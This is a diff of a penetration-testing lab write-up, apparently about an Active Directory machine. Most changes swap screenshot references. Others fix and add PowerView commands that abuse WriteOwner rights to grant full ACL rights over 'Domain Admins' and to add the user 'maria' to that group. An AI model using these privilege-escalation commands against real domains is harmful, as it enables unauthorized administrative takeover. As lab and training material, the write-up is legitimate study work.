@@ -156,7 +156,7 @@ sudo tcpdump -i tun0
 
 TCPDump output (Receiving ICMP traffic from the target):
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Exploitation
 
@@ -251,7 +251,7 @@ Placed it into BloodHound and examined the information:
 
 **Shortest Paths to High Value Targets:**
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 * Set <mark style="color:yellow;">Oliver</mark> user as <mark style="color:yellow;">owned</mark>
 * This is a messy output -- can we simplify with another query?
@@ -404,8 +404,7 @@ Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity maria
 * <mark style="color:yellow;">This was referenced from BloodHound's WriteOwner Abuse Tab</mark>
 
 ```
-Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Right
-s WriteMembers
+Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights WriteMembers
 ```
 
 ```
@@ -418,20 +417,22 @@ Granting Rights All:
 Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity Maria -Rights All
 ```
 
+```
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
+```
+
 Add Maria to "Domain Admins" group:
 
 ```
 net group "Domain Admins" /domain
 ```
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-We are now in the Domain Admins group
+Maria is now in the Domain Admins group
 
-
-
-### PrivEsc vector
-
-
+* This means that we can now cd into the Administrator's directories and have read/write on the files
 
 ## Proofs
+
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
